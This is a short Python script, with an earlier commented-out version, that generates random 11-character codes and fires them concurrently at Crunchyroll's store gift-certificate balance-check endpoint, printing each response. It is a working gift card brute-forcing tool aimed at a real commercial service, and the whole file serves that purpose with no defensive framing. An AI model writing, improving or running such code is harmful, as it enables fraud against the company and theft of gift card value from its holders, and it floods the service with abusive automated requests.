# import requests as r

# import random
# import string

# def generate_pattern(length):
#     characters = string.ascii_uppercase + string.digits
#     pattern = ''.join(random.choice(characters) for _ in range(length))
#     return pattern





# def testurl(giftcode):
#     url = f"https://store.crunchyroll.com/on/demandware.store/Sites-CrunchyrollUS-Site/fr_FR/CheckoutServices-CheckBalance?giftCertCode={giftcode}"
#     try:
#         response = r.get(url)
#         data = response.json()

#         if 'error' in data:
#             print(data['error'])
#     except:
#         return False
    

# number = int(input('How many codes to generate?'))
# for i in range(0, number):
#     code  = generate_pattern(11)
#     testurl(code)


import asyncio
import aiohttp
import random
import string
print('hello welcome to the Crunchyroll gift card test!')
async def generate_and_test_code():
    characters = string.ascii_uppercase + string.digits
    code = ''.join(random.choice(characters) for _ in range(11))
    
    url = f"https://store.crunchyroll.com/on/demandware.store/Sites-CrunchyrollUS-Site/en_US/CheckoutServices-CheckBalance?giftCertCode={code}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                data = await response.json()

                if 'error' in data:
                    print(data['error'])
    except Exception as e:
        print(f"Error with code {code}: {e}")

async def main():
    number = int(input('How many codes to generate?'))
    await asyncio.gather(*(generate_and_test_code() for _ in range(number)))

if __name__ == "__main__":
    asyncio.run(main())
